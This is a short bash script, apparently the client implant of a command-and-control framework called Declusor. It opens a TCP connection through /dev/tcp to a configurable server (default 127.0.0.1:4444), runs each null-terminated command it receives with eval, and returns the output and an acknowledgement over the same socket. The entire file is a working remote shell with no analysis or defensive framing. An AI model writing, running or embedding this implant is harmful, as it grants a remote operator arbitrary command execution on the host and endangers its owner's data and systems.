#!/bin/bash
# -----------------------------------------------------------------------------
# Declusor Bash Client
# Connects to a C2 server, reads null-terminated commands, executes them,
# and returns the output.
# -----------------------------------------------------------------------------

# Configuration (Defaults)
HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-4444}"
ACKNOWLEDGE="${ACKNOWLEDGE:-ACK}"

# Execution Loop
# 1. Open TCP connection on file descriptor 3
# 2. Read null-delimited data into 'x'
# 3. Execute 'x' and redirect stdout/stderr to fd 3
# 4. Send Acknowledge string
exec 3<>/dev/tcp/"$HOST"/"$PORT"
while read -r -d '' x <&3; do
    eval "$x" >&3 2>&3
    printf "%s" "$ACKNOWLEDGE" >&3
done